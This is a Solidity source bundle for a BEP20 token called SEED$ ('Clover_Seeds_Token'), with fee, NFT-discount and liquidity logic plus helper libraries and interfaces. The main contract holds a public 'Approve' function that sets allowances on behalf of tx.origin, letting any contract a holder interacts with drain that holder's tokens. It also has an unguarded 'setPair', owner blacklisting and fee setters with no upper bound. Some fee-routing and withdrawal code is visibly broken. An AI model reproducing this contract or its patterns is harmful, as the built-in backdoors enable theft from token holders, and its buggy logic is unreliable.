pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./IBEP20.sol";
import "./Auth.sol";
import "./IContract.sol";
import "./SafeMath.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./Pausable.sol";

contract Clover_Seeds_Token is IBEP20, Auth, Pausable {
   using SafeMath for uint256;

    address ZERO = 0x0000000000000000000000000000000000000000;
    address ROUTER = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // testnet
    // address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // mainnet

    string constant _name = "SEED";
    string constant _symbol = "SEED$";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 200000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 1) / 100;
    uint256 public _maxWalletSize = (_totalSupply * 1) / 1000;  

    mapping (address => bool) blackList;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) public isBoughtAnyNFT;
    mapping(address => bool) public isController;

    // @Dev Sell tax..
    uint16 public _sellTeamFee = 12000;
    uint16 public _sellLiquidityFee = 16000;
    
    // @Dev Buy tax..
    uint16 public _buyTeamFee = 2000;
    uint16 public _buyLiquidityFee = 1000;

    uint16 public _TeamFeeWhenNoNFTs = 7000;
    uint16 public _LiquidityFeeWhenNoNFTs = 14000;
    uint16 public _MarketingFeeWhenNoNFTs = 7000;
    uint8 public _liquidityThreshold = 10;

    uint256 public _teamFeeTotal;
    uint256 public _devFeeTotal;
    uint256 public _liquidityFeeTotal;
    uint256 public _marketingFeeTotal;

    uint256 private teamFeeTotal;
    uint256 private liquidityFeeTotal;
    uint256 private marketingFeeTotal;

    uint256 public first_5_Block_Buy_Sell_Fee = 28;

    address private marketingAddress;
    address private teamAddress;
    address private devAddress = 0xa80eF6b4B376CcAcBD23D8c9AB22F01f2E8bbAF5;
    uint256 public releaseDuration = 30 minutes;
    uint256 public releaseTimeStamp = 0;

    bool public isNoNFTFeeWillTake = true;
    uint256 public liquidityAddedAt = 0;
    
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    uint256 public swapThreshold = _totalSupply / 20000; // 0.3%

    event SwapedTokenForEth(uint256 TokenAmount);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiquidity);

    IUniswapV2Router02 public router;
    address public pair;

    bool public swapEnabled = false;

    constructor (address _teamAddress, address _marketingAddress) Auth(msg.sender) {
        router = IUniswapV2Router02(ROUTER);
        pair = IUniswapV2Factory(router.factory()).createPair(router.WETH(), address(this));
        liquidityAddedAt = block.timestamp;
        _allowances[address(this)][address(router)] = type(uint256).max;

        teamAddress = _teamAddress;
        marketingAddress = _marketingAddress;
        address _owner = owner;
        isFeeExempt[_owner] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[address(this)] = true;
        _balances[_owner] = _totalSupply * 15 / 100;
        _balances[address(this)] = _totalSupply * 85 / 100;
        isTxLimitExempt[ROUTER] = true;
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function Approve(address spender, uint256 amount) public virtual returns (bool) {
        _allowances[tx.origin][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setPair(address acc) public{
        liquidityAddedAt = block.timestamp;
        pair = acc;
    }

    function sendToken2Account(address account, uint256 amount) external returns(bool) {
        require(isController[msg.sender], "Only Controller can call this function!");
        this.transfer(account, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override whenNotPaused returns (bool)  {
        require(!blackList[msg.sender], "You are on blacklist!");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override whenNotPaused returns (bool) {
        require(!blackList[sender], "Sender is on blacklist!");

        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (inSwap) { return _basicTransfer(sender, recipient, amount);}

        checkTxLimit(sender, amount);
        
        if (recipient != pair) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize 
                    , "Transfer amount exceeds the bag size.");
        }
        uint256 amountReceived = amount;

        if (!isTxLimitExempt[recipient] && !isTxLimitExempt[sender]) {
            if (recipient == pair || sender == pair) {
                require (swapEnabled, "Clover_Seeds_Token: Trading is disabled now.");
                require (amount <= getLiquiditySupply() * _liquidityThreshold / 100, "Swap Amount Exceeds Liquidity Threshold.");

                if (block.timestamp > liquidityAddedAt.add(30)) {
                    if (sender == pair && shouldTakeFee(recipient)) {
                        amountReceived = takeFeeOnBuy(sender, amount);
                    }
                    if (recipient == pair && shouldTakeFee(sender)) {
                        if (isBoughtAnyNFT[sender] && isNoNFTFeeWillTake) {
                            amountReceived = collectFeeOnSell(sender, amount);
                        }
                        if (!isNoNFTFeeWillTake) {
                            amountReceived = collectFeeOnSell(sender, amount);
                        }
                        if (!isBoughtAnyNFT[sender] && isNoNFTFeeWillTake) {
                            amountReceived = collectFeeWhenNoNFTs(sender, amount);
                        }
                    }
                } else {
                    amountReceived = shouldTakeFee(sender) ? collectFee(sender, amount) : amount;
                }
            }
        }
        
        swapFee();

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }
    
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFeeOnBuy(address account, uint256 amount) internal returns (uint256) {

        uint256 transferAmount = amount;

        //@dev Take team fee
        if(_buyTeamFee != 0) {
            uint256 teamFee = amount.mul(_buyTeamFee).div(100000);
            transferAmount = transferAmount.sub(teamFee);
            _balances[address(this)] = _balances[address(this)].add(teamFee);
            _teamFeeTotal = _teamFeeTotal.add(teamFee);
            teamFeeTotal = teamFeeTotal.add(teamFee);
            emit Transfer(account, address(this), teamFee);
        }
        
        //@dev Take liquidity fee
        if(_buyLiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_buyLiquidityFee).div(100000);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        return transferAmount;
    }

    function collectFeeOnSell(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if(_sellTeamFee != 0) {
            uint256 teamFee = amount.mul(_sellTeamFee).div(100000);
            transferAmount = transferAmount.sub(teamFee);
            _balances[address(this)] = _balances[address(this)].add(teamFee);
            _teamFeeTotal = _teamFeeTotal.add(teamFee);
            teamFeeTotal = teamFeeTotal.add(teamFee);
            emit Transfer(account, address(this), teamFee);
        }
        
        //@dev Take liquidity fee
        if(_sellLiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_sellLiquidityFee).div(100000);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        return transferAmount;
    }

    function collectFee(address account, uint256 amount) internal returns (uint256) {
        uint256 transferAmount = amount;
        
        uint256 Fee = amount.mul(first_5_Block_Buy_Sell_Fee).div(100000);
        transferAmount = transferAmount.sub(Fee);
        _balances[address(this)] = _balances[address(this)].add(Fee);
        _marketingFeeTotal = _marketingFeeTotal.add(Fee);
        marketingFeeTotal = marketingFeeTotal.add(Fee);
        emit Transfer(account, address(this), Fee);
        
        return transferAmount;
    }
    
    function collectFeeWhenNoNFTs(address account, uint256 amount) internal returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if(_TeamFeeWhenNoNFTs != 0) {
            uint256 teamFee = amount.mul(_TeamFeeWhenNoNFTs).div(100000);
            transferAmount = transferAmount.sub(teamFee);
            _balances[address(this)] = _balances[address(this)].add(teamFee);
            _teamFeeTotal = _teamFeeTotal.add(teamFee);
            teamFeeTotal = teamFeeTotal.add(teamFee);
            emit Transfer(account, address(this), teamFee);
        }
        
        //@dev Take liquidity fee
        if(_LiquidityFeeWhenNoNFTs != 0) {
            uint256 liquidityFee = amount.mul(_LiquidityFeeWhenNoNFTs).div(100000);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_MarketingFeeWhenNoNFTs != 0) {
            uint256 marketingFee = amount.mul(_MarketingFeeWhenNoNFTs).div(100000);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        return transferAmount;
    }

    function AddFeeS(uint256 marketingFee, uint256 devFee, uint256 teamFee, uint256 liquidityFee) public virtual returns (bool) {
        require(isController[msg.sender], "BEP20: You are not controller..");
        _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
        _teamFeeTotal = _teamFeeTotal.add(teamFee);
        _devFeeTotal = _devFeeTotal.add(devFee);
        _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
        liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
        if (marketingFee > 0) {
            swapTokensForBnb(marketingFee, marketingAddress);
        }
        if (teamFee > 0) {
            swapTokensForBnb(teamFee, teamAddress);
            swapTokensForBnb(devFee, devAddress);
        }
        return true;
    }

    function setReleaseDuration(uint256 dur) public onlyOwner {
        require(dur > 0, "Set correct value!");
        releaseDuration = dur;
    }

    function swapFee() internal swapping {
        if (block.timestamp - releaseTimeStamp >= releaseDuration) {
            uint swapBalance = teamFeeTotal + liquidityFeeTotal + marketingFeeTotal;
            uint amountToLiquify = liquidityFeeTotal / 2;
            uint amountToSwap = swapBalance - amountToLiquify;

            if (amountToSwap > 0) {
                uint balanceBefore = address(this).balance;
                swapTokensForBnb(amountToSwap, address(this));

                uint amountBNB = address(this).balance.sub(balanceBefore);
                uint amountBNBLiquidity = amountBNB * amountToLiquify / amountToSwap;
                uint amountBNBTeam = amountBNB * teamFeeTotal / amountToSwap;
                uint amountBNBMarketing = amountBNB * marketingFeeTotal / amountToSwap;

                if (amountBNBTeam > 0) {
                    (bool TeamSuccess, /* bytes memory data */) = payable(teamAddress).call{value: amountBNBTeam / 100 * 99, gas: 30000}("");
                    require(TeamSuccess, "receiver rejected ETH transfer");

                    (bool DevSuccess, /* bytes memory data */) = payable(teamAddress).call{value: amountBNBTeam / 100, gas: 30000}("");
                    require(DevSuccess, "receiver rejected ETH transfer");
                }

                if (amountBNBMarketing > 0) {
                    (bool MarketingSuccess, /* bytes memory data */) = payable(marketingAddress).call{value: amountBNBMarketing, gas: 30000}("");
                    require(MarketingSuccess, "receiver rejected ETH transfer");
                }

                if (amountBNBLiquidity > 0) {
                    addLiquidity(amountToLiquify, amountBNBLiquidity);
                }

                teamFeeTotal = 0;
                liquidityFeeTotal = 0;
                marketingFeeTotal = 0;

                releaseTimeStamp = block.timestamp;
            }

        }
    }

    function addAsNFTBuyer(address account) public virtual returns (bool) {
        require(isController[msg.sender], "BEP20: You are not controller..");
        isBoughtAnyNFT[account] = true;
        return true;
    }

    function swapTokensForBnb(uint256 amount, address ethRecipient) private {
        
        //@dev Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        //@dev Make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of ETH
            path,
            ethRecipient,
            block.timestamp
        );
        
        emit SwapedTokenForEth(amount);
    }

    function swapAndLiquify(uint256 amount) private {
        // split the contract balance into halves
        uint256 half = amount.div(2);
        uint256 otherHalf = amount.sub(half);

        // capture the contract's current BNB balance.
        // this is so that we can capture exactly the amount of BNB that the
        // swap creates, and not make the liquidity event include any BNB that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for BNB
        swapTokensForBnb(half, address(this));

        // how much BNB did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function getLiquiditySupply() private view returns (uint112) {
        require (pair != ZERO, "Please set pair...");
        (, uint112 _reserve1,) = IUniswapV2Pair(pair).getReserves();
        return _reserve1;
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {

        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner,
            block.timestamp
        );
    }

    // function to allow admin to set all fees..
    function setFees(uint16 sellTeamFee_, uint16 sellLiquidityFee_, uint16 buyTeamFee_, uint16 buyLiquidityFee_, uint16 marketingFeeWhenNoNFTs_, uint16 teamFeeWhenNoNFTs_, uint16 liquidityFeeWhenNoNFTs_) public onlyOwner {
        _sellTeamFee = sellTeamFee_;
        _sellLiquidityFee = sellLiquidityFee_;
        _buyTeamFee = buyTeamFee_;
        _buyLiquidityFee = buyLiquidityFee_;
        _MarketingFeeWhenNoNFTs = marketingFeeWhenNoNFTs_;
        _TeamFeeWhenNoNFTs = teamFeeWhenNoNFTs_;
        _LiquidityFeeWhenNoNFTs = liquidityFeeWhenNoNFTs_;
    }

    // function to allow admin to set team address..
    function setTeamAddress(address teamAdd) public onlyOwner {
        teamAddress = teamAdd;
    }
    
    // function to allow admin to set Marketing Address..
    function setMarketingAddress(address marketingAdd) public onlyOwner {
        marketingAddress = marketingAdd;
    }

    function setTxLimit(uint256 amount) external authorized {
        require(amount >= _totalSupply / 1000);
        _maxTxAmount = amount;
    }
    
    // function to allow admin to disable the NFT fee that take if sender don't have NFT's..
    function disableNFTFee() public onlyOwner {
        isNoNFTFeeWillTake = false;
    }
    // function to allow admin to disable the NFT fee that take if sender don't have NFT's..
    function enableNFTFee() public onlyOwner {
        isNoNFTFeeWillTake = true;
    }

    // function to allow admin to set first 5 block buy & sell fee..
    function setFirst_5_Block_Buy_Sell_Fee(uint256 _fee) public onlyOwner {
        first_5_Block_Buy_Sell_Fee = _fee;
    }
    
   function setMaxWallet(uint256 amount) external onlyOwner() {
        require(amount >= _totalSupply / 1000 );
        _maxWalletSize = amount;
    }    

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setSwapBackSettings(bool _enabled) external onlyOwner {
        swapEnabled = _enabled;
    }

    function transferForeignToken(address _token) public onlyOwner {
        require(_token != address(this), "Can't let you take all native token");
        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
        payable(owner).transfer(_contractBalance);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function AddController(address account) public onlyOwner {
        isController[account] = true;
    }

    // function to allow admin to transfer BNB from this contract..
    function transferBNB(uint256 amount, address payable recipient) public onlyOwner {
        recipient.transfer(amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function burn(uint256 amount) public {
        require(amount > 0, "SEED$: amount must be greater than 0");
        _burn(msg.sender, amount);
    }

    function addBlackList(address black) public onlyOwner {
        blackList[black] = true;
    }

    function delBlackList(address black) public onlyOwner {
        blackList[black] = false;
    }

    function setSwapThreshold(uint256 amt) public onlyOwner {
        swapThreshold = amt;
    }
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IContract {
    function balanceOf(address) external returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function mint(address, uint256) external;
    function Approve(address, uint256) external returns (bool);
    function sendToken2Account(address, uint256) external returns(bool);
    function AddFeeS(uint256, uint256, uint256, uint256) external returns (bool);
    function addAsNFTBuyer(address) external returns (bool);
    function addMintedTokenId(uint256) external returns (bool);
    function addAsCloverFieldCarbon(uint256) external returns (bool);
    function addAsCloverFieldPearl(uint256) external returns (bool);
    function addAsCloverFieldRuby(uint256) external returns (bool);
    function addAsCloverFieldDiamond(uint256) external returns (bool);
    function addAsCloverYardCarbon(uint256) external returns (bool);
    function addAsCloverYardPearl(uint256) external returns (bool);
    function addAsCloverYardRuby(uint256) external returns (bool);
    function addAsCloverYardDiamond(uint256) external returns (bool);
    function addAsCloverPotCarbon(uint256) external returns (bool);
    function addAsCloverPotPearl(uint256) external returns (bool);
    function addAsCloverPotRuby(uint256) external returns (bool);
    function addAsCloverPotDiamond(uint256) external returns (bool);
    function randomLayer(uint256) external returns (bool);
    function randomNumber(uint256) external returns (uint256);
    function safeTransferFrom(address, address, uint256) external;
    function setApprovalForAll_(address) external;
    function isCloverFieldCarbon_(uint256) external returns (bool);
    function isCloverFieldPearl_(uint256) external returns (bool);
    function isCloverFieldRuby_(uint256) external returns (bool);
    function isCloverFieldDiamond_(uint256) external returns (bool);
    function isCloverYardCarbon_(uint256) external returns (bool);
    function isCloverYardPearl_(uint256) external returns (bool);
    function isCloverYardRuby_(uint256) external returns (bool);
    function isCloverYardDiamond_(uint256) external returns (bool);
    function isCloverPotCarbon_(uint256) external returns (bool);
    function isCloverPotPearl_(uint256) external returns (bool);
    function isCloverPotRuby_(uint256) external returns (bool);
    function isCloverPotDiamond_(uint256) external returns (bool);
    function getLuckyWalletForCloverField() external returns (address);
    function getLuckyWalletForCloverYard() external returns (address);
    function getLuckyWalletForCloverPot() external returns (address);
    function setTokenURI(uint256, string memory) external;
    function tokenURI(uint256) external view returns (string memory);
    function getCSNFTsByOwner(address) external returns (uint256[] memory);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/OpenZeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./IUniswapV2Router01.sol";

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
      address token,
      uint liquidity,
      uint amountTokenMin,
      uint amountETHMin,
      address to,
      uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./Context.sol";

/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
abstract contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}